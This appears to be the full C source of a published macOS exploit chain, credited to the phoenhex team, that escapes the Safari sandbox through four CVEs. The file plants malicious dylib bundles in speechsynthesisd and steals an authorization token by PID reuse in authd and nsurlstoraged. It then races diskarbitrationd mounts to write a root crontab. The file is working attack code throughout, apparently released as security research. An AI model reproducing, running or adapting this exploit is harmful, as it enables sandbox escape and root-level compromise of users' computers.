// Exploit using following bugs to escape Safari sandbox:
//
// * CVE-2017-2533: TOCTOU in diskarbitrationd
// * CVE-2017-2535: PID reuse logic bug in authd
// * CVE-2017-2534: Arbitrary dylib loading in speechsynthesisd
// * CVE-2017-6977: NULL ptr dereference in nsurlstoraged
//
// by phoenhex team (niklasb & saelo)
//
// see LICENSE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <dirent.h>
#include <signal.h>
#include <pthread.h>

#include <fcntl.h>
#include <mach/mach.h>
#include <pwd.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <sys/ucred.h>
#include <unistd.h>
#include <mach/vm_map.h>

#include <CoreFoundation/CoreFoundation.h>
#include <Security/Authorization.h>
#include <servers/bootstrap.h>
#include <xpc/xpc.h>

#include "ssd1.dylib.gen.h"
#include "ssd2.dylib.gen.h"
#include "bundle/Info.plist.gen.h"
#include "bundle/version.plist.gen.h"

char workdir[1024];

#define SYNTH "Pwn.SpeechSynthesizer"
#define DISK "/dev/disk0s1"

#include "common.h"
#include "proc.h"
#include "DAServer.h"

pid_t token_pid;
AuthorizationRef auth;
AuthorizationExternalForm token;

void patch_payload(char* payload, size_t payload_size) {
  const char* pattern = "pwnedbysaeloandniklasb";
  char* end = payload + payload_size - strlen(pattern), *p = payload;
  while (p != end) {
    if (!strcmp(p, pattern)) {
      log("Patching payload at offset %d\n", p - payload);
      strcpy(p, workdir);
      p += strlen(pattern);
    }
    ++p;
  }
}

void create_bundle(unsigned char* payload, size_t payload_size) {
  patch_payload((char*)payload, payload_size);
  mkdir(SYNTH, 0777);
  mkdir(SYNTH "/Contents", 0777);
  mkdir(SYNTH "/Contents/MacOS", 0777);
  write_file(SYNTH "/Contents/Info.plist", bundle_Info_plist, bundle_Info_plist_len);
  write_file(SYNTH "/Contents/version.plist", bundle_version_plist, bundle_version_plist_len);
  write_file(SYNTH "/Contents/MacOS/MacinTalk", payload, payload_size);
}

void pwn_ssd(bool sync) {
  xpc_connection_t conn = xpc_connection_create_mach_service(
        "com.apple.speech.speechsynthesisd", 0, 0);
  assert(conn);
  xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
  });
  xpc_connection_resume(conn);
  log("  Connected to ssd\n");

  xpc_object_t message = xpc_dictionary_create(0, 0, 0);
  xpc_dictionary_set_int64(message, "msg", 110);
  char path[1024]={0};
  strcpy(path, workdir);
  strcat(path, "/");
  strcat(path, SYNTH);
  xpc_dictionary_set_string(message, "path", path);

  if (sync) {
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, message);
  } else {
    dispatch_queue_t q = dispatch_get_main_queue();
    xpc_connection_send_message_with_reply(conn, message, q, ^(xpc_object_t evt) {
    });
  }
}

xpc_connection_t connect_to_cookied() {
  xpc_connection_t conn = xpc_connection_create_mach_service("com.apple.cookied", 0, 0);
  assert(conn);
  xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
  });
  xpc_connection_resume(conn);
  //log("  Connected to cookied.\n");

  const char *session = "foobar";
  xpc_object_t message = xpc_dictionary_create(0, 0, 0);
  xpc_dictionary_set_int64(message, "kCFNCookieServerMessageTypeKey", 1);
  xpc_dictionary_set_bool(message, "kCFNCookieServerPersistentKey", 1);
  xpc_dictionary_set_string(message, "kCFNCookieServerIdentifierKey", session);
  xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, message);
  assert(reply);
  assert(xpc_dictionary_get_bool(reply, "kCFNCookieServerSuccessKey"));

  return conn;
}

void crash_cookied() {
  xpc_connection_t conn = connect_to_cookied();
  log("  Connected to cookied. Trying to crash it...\n");

  // TODO instead of waiting for response, just wait for process to get started
  xpc_object_t message = xpc_dictionary_create(0, 0, 0);
  xpc_dictionary_set_int64(message, "kCFNCookieServerMessageTypeKey", 4);
  xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, message);
  assert(reply);
}

void respawn_cookied() {
  crash_cookied();
  connect_to_cookied();
}

struct DASession {
  mach_port_t server_port, session_port;
} dasess;

void da_connect() {
  kern_return_t kr;
  kr = bootstrap_look_up(bootstrap_port,
        "com.apple.DiskArbitration.diskarbitrationd", &dasess.server_port);
  if (kr != KERN_SUCCESS) log("MIG error: %s\n", bootstrap_strerror(kr));
  assert(kr == KERN_SUCCESS);

  kr = _DAServerSessionCreate(dasess.server_port, "foo", 0, &dasess.session_port);
  if (kr != KERN_SUCCESS) log("MIG error: %s\n", bootstrap_strerror(kr));
  assert(kr == KERN_SUCCESS);
}

void da_auth() {
  kern_return_t kr;
  kr = _DAServerSessionSetAuthorization(dasess.session_port, token);
  if (kr != KERN_SUCCESS) log("MIG error: %s\n", bootstrap_strerror(kr));
  assert(kr == KERN_SUCCESS);
}

extern CFIndex __CFBinaryPlistWriteToStream( CFPropertyListRef plist, CFTypeRef stream );
CFDataRef da_serialize(CFTypeRef obj) {
  CFDataRef data = CFDataCreateMutable(0, 0);
  assert(data);
  assert(__CFBinaryPlistWriteToStream(obj, data));
  return data;
}

bool da_mount(const char* disk, const char* mount_point) {
  kern_return_t kr;

  CFStringRef mp = CFStringCreateWithCString(0, mount_point, 0x8000100);
  assert(mp);
  CFDataRef mp_ser = da_serialize(mp);
  assert(mp_ser);

  kr = _DAServerSessionQueueRequest(
          dasess.session_port,
          7, // kind = _kDADiskMount
          // arg0
          (char*)disk,
          // arg1
          0,
          // arg2
          (vm_address_t)CFDataGetBytePtr(mp_ser), CFDataGetLength(mp_ser),
          // arg3
          0, 0,
          // address, context
          0, 0
        );

  if (kr != KERN_SUCCESS)
    log("MIG error: %d %s\n", kr, bootstrap_strerror(kr));
  return kr == KERN_SUCCESS;
}

bool da_umount(const char* disk) {
  kern_return_t kr;

  kr = _DAServerSessionQueueRequest(
          dasess.session_port,
          13, // kind = _kDADiskUnmount
          // arg0
          (char*)disk,
          // arg1
          0,
          // arg2
          0, 0,
          // arg3
          0, 0,
          // address, context
          0, 0
        );

  if (kr != KERN_SUCCESS)
    log("MIG error: %d %s\n", kr, bootstrap_strerror(kr));
  return kr == KERN_SUCCESS;
}

const char* get_mount_point(const char* disk) {
  struct statfs *mntbuf;
  int cnt = getmntinfo(&mntbuf, 0);
  for (int i = 0; i < cnt; ++i)
    if (!strcmp(mntbuf[i].f_mntfromname, disk))
      return mntbuf[i].f_mntonname;
  return 0;
}

void setup_mount_race() {
  mkdir("mnt", 0777);
}

int cmp_procs_by_pid(const void* av, const void* bv) {
  const struct kinfo_proc* a = av;
  const struct kinfo_proc* b = bv;
  pid_t ap = a->kp_proc.p_pid;
  pid_t bp = b->kp_proc.p_pid;
  if (ap < bp) return -1;
  if (ap == bp) return 0;
  return 1;
}

void print_process_list() {
  get_process_list();
  qsort(proc_list.procList, proc_list.procCount, sizeof *proc_list.procList, cmp_procs_by_pid);
  for (size_t i = 0; i < proc_list.procCount; ++i) {
    struct kinfo_proc* proc = proc_list.procList + i;
    pid_t pid = proc->kp_proc.p_pid;
    log("    Proc %d: uid=%d cmd=%s\n",
        pid, proc->kp_eproc.e_ucred.cr_uid,
        proc->kp_proc.p_comm);
  }
}

bool is_cookied(struct kinfo_proc* proc) {
  return !strcmp("nsurlstoraged", proc->kp_proc.p_comm)
      && proc->kp_eproc.e_ucred.cr_uid == 501;
}

bool respawn_cookied_into(pid_t target) {
  for(int iter = 0; iter < 15; ++iter) {
    log("Iteration %d\n", iter);
    respawn_cookied();
    get_process_list();
    // TODO debugging loop, maybe remove
    qsort(proc_list.procList, proc_list.procCount, sizeof *proc_list.procList, cmp_procs_by_pid);
    for (size_t i = 0; i < proc_list.procCount; ++i) {
      struct kinfo_proc* proc = proc_list.procList + i;
      pid_t pid = proc->kp_proc.p_pid;
      if (abs(pid - target) < 10 || is_cookied(proc))
        log("    Proc %d: uid=%d cmd=%s\n",
            pid, proc->kp_eproc.e_ucred.cr_uid,
            proc->kp_proc.p_comm);
    }
    for (size_t i = 0; i < proc_list.procCount; ++i) {
      struct kinfo_proc* proc = proc_list.procList + i;
      pid_t pid = proc->kp_proc.p_pid;
      if (pid == target) {
        if (is_cookied(proc)) {
          log("  Successfully spawned nsurlstoraged with PID %d\n", target);
          return true;
        } else {
          log("  Got invalid process %s at %d\n", proc->kp_proc.p_comm, target);
          return false;
        }
      }
      if (is_cookied(proc) && pid > target) {
        log("  Skipped past target pid %d\n", target);
        return false;
      }
    }
  }
  log("  Never saw PID %d begin reused\n", target);
  return false;
}

void delete_recursive(const char* path) {
  DIR* d = opendir(path);
  struct dirent* entry;

  if (!strcmp(path + strlen(path) - 3, "mnt")) {
    log("  Refusing to delete %s recursively\n", path);
    return;
  }
  log("  Cleaning up %s\n", path);
  while ((entry = readdir(d))) {
    if (!strcmp(entry->d_name, ".")||!strcmp(entry->d_name, "..")) continue;
    //log("    %s %d\n", entry->d_name, (int)entry->d_type);

    char entry_path[1024];
    strcpy(entry_path, path);
    strcat(entry_path, "/");
    strcat(entry_path, entry->d_name);
    if (entry->d_type == 4) {
      delete_recursive(entry_path);
      if (rmdir(entry_path)) {
        log("    Could not rmdir %s\n", entry_path);
      }
    } else {
      if (unlink(entry_path)) {
        log("    Could not unlink %s\n", entry_path);
      }
    }
  }
}

void unmap_large_safari_heap_pages() {
  // code adapted from http://www.newosxbook.com/src.jl?tree=listings&file=12-1-vmmap.c
  kern_return_t kret;
  mach_vm_address_t prev_address;
  vm_region_basic_info_data_t info;
  mach_vm_size_t size, prev_size;

  mach_port_t object_name;
  mach_msg_type_number_t count;

  //log("Memory map\n=============\n");
  for (mach_vm_address_t address = 1;; address += size) {
    /* Check to see if address space has wrapped around. */
    if (address == 0) break;

    // Even on iOS, we use VM_REGION_BASIC_INFO_COUNT_64. This works.
    count = VM_REGION_BASIC_INFO_COUNT_64;
    kret = mach_vm_region(mach_task_self(), &address, &size, VM_REGION_BASIC_INFO,
                          (vm_region_info_t) &info, &count, &object_name);
    if (kret != KERN_SUCCESS) {
      assert(kret == KERN_INVALID_ADDRESS);
      break;
    }

    // TODO remove debug output
    unsigned long long print_size = size;
    char *print_size_unit;
    if (print_size > 1024) { print_size /= 1024; print_size_unit = "K"; }
    if (print_size > 1024) { print_size /= 1024; print_size_unit = "M"; }
    if (print_size > 1024) { print_size /= 1024; print_size_unit = "G"; }
    /*
    log("  %016llx-%016llx [%lld%s]\n",
        address,
        (address + size),
        print_size,
        print_size_unit);
        */

    unsigned long long addr = address;
    if ((addr >> 32) >= 0x02 && (addr >> 32) <= 0x20) {
      assert(!munmap(address, size));
    }
  }
  //log("=============\n");
}

void sigsegv_handler(int sig, siginfo_t *si, void *unused) {
  sleep(1000);
}

void register_sigsegv_handler() {
  struct sigaction sa;
  sa.sa_flags = SA_SIGINFO;
  sigemptyset(&sa.sa_mask);
  sa.sa_sigaction = sigsegv_handler;
  if (sigaction(SIGSEGV, &sa, NULL) == -1)
    if (debug_mode)
      abort(); // TODO if (debug_mode)
  if (sigaction(SIGBUS, &sa, NULL) == -1)
    if (debug_mode)
      abort(); // TODO if (debug_mode)
  if (sigaction(SIGILL, &sa, NULL) == -1)
    if (debug_mode)
      abort(); // TODO if (debug_mode)
  if (sigaction(SIGTRAP, &sa, NULL) == -1)
    if (debug_mode)
      abort(); // TODO if (debug_mode)
}

__attribute__((constructor))
void _injection() {
  register_sigsegv_handler();

  confstr(_CS_DARWIN_USER_CACHE_DIR, workdir, sizeof workdir);
  mkdir(workdir, 0777);
  if (workdir[strlen(workdir)-1] != '/')
    strcat(workdir, "/");
  strcat(workdir, "com.apple.speech.speechsynthesisd/");
  mkdir(workdir, 0777);
  chdir(workdir);

  init("webcontent");

  char buf[1024];
  log("Workdir is %s\n", getcwd(buf, sizeof buf));

  log("Cleaning up memory\n");
  unmap_large_safari_heap_pages();

  assert(!get_mount_point(DISK));

  for (int iter = 0; ; ++iter) {
    log("Iteration %d of PID wraparound\n", iter);
    log("==============================\n");
    log("Cleaning up working dir\n");
    delete_recursive(".");

    create_bundle(ssd1_dylib, ssd1_dylib_len);
    log("Created bundle (1)\n");

    // TODO reset ssd so the following always works
    pwn_ssd(0);
    log("Pwned ssd (1)\n");

    // TODO remove debugging
    while(!pid_for_proc("com.apple.s")) msleep(100);
    log("PID for ssd1 = %d\n", pid_for_proc("com.apple.s"));

    log("Waiting for ssd1 results...\n");
    int f1 = wait_for_file("token_pid");
    int f2 = wait_for_file("token");

    readall(f1, (char*)&token_pid, sizeof token_pid, true);
    readall(f2, token.bytes, kAuthorizationExternalFormLength, true);

    log("Token PID = %d\n", token_pid);

    // Import token
    assert(!AuthorizationCreateFromExternalForm(&token, &auth));
    log("Token imported successfully\n");
    write_marker("token_imported");

    log("Waiting for ssd1 to die\n");
    wait_for_file("ssd1_done");
    sleep(1);
    log("Yes, it's dead.\n");

    create_bundle(ssd2_dylib, ssd2_dylib_len);
    log("Created bundle (2)\n");
    pwn_ssd(0);
    log("Pwned ssd (2)\n");

    // TODO remove debugging
    while(!pid_for_proc("com.apple.s")) msleep(100);
    log("PID for ssd2 = %d\n", pid_for_proc("com.apple.s"));


    log("Waiting for ssd2 to wrap around PIDs\n");
    wait_for_file("hole_done");
    log("Respawning cookied\n");
    if (respawn_cookied_into(token_pid))
      break;
    log("Didn't work. Trying again\n");
    write_file("ssd2_next_step", (const unsigned char*)"exit", 5);
    wait_for_file("ssd2_next_step_ack");
  }
  log("Got it.\n");

  log("Connecting to DA\n");
  da_connect();
  log("Authenticating with DA\n");
  da_auth();

  setup_mount_race();

  // TODO maybe sleep less than one second below?
  //
  // umount first in case this is not the first iteration of the exploit
  if (get_mount_point(DISK)) {
    log("The disk is already mounted, trying umount\n");
    da_umount(DISK);
    msleep(1000);
    while (get_mount_point(DISK)) {
      log("    Retrying umount\n");
      da_umount(DISK);
      msleep(1000);
    }
  }

  // TODO make sure ssd2 is killed regardless of whether the exploit is
  // successful or not. Can we somehow crash it easily?

  log("Performing initial mount\n");
  char mnt_point[1024];
  strcpy(mnt_point, workdir);
  strcat(mnt_point, "/mnt");

  da_mount(DISK, mnt_point);
  msleep(1000);
  while (!get_mount_point(DISK)) {
    log("    Retrying mount\n");
    da_mount(DISK, mnt_point);
    msleep(1000);
  }

  log("Writing crontab.\n");
  write_file("mnt/root", cronrule, strlen(cronrule));
  log("Unmounting\n");
  log("%s\n", get_mount_point(DISK));

  da_umount(DISK);
  msleep(1000);
  while (get_mount_point(DISK)) {
    log("    Retrying umount\n");
    da_umount(DISK);
    msleep(1000);
  }

  write_file("ssd2_next_step", (const unsigned char*)"race", 5);
  wait_for_file("ssd2_next_step_ack");
  log("Wrote marker to start race\n");

  int i = 0;
  log("Starting race\n");

  strcpy(mnt_point, workdir);
  strcat(mnt_point, "/pwn/tabs");
  for (;;) {
    log("  Round %d\n", i++);

    da_mount(DISK, mnt_point);
    msleep(1000);
    const char* mnt;
    while (!(mnt = get_mount_point(DISK))) {
      log("    Retrying mount\n");
      da_mount(DISK, mnt_point);
      msleep(1000);
    }

    log("    Mount point: %s\n", mnt);
    if (!strncmp(mnt, "/private/var/at", strlen("/private/var/at")))
      break;

    log("  Unmounting...\n");
    da_umount(DISK);
    msleep(1000);
    while (get_mount_point(DISK)) {
      log("    Retrying umount\n");
      da_umount(DISK);
      msleep(1000);
    }
  }
  log("Success! %s is mounted at %s.\n", DISK, get_mount_point(DISK));
  log("now wait a minute... I'm out. You can press Ctrl+C\n");
  write_marker("stop_mount_race");
  sleep(10000);

  // TODO WebContent will crash hereafter. Why?
}
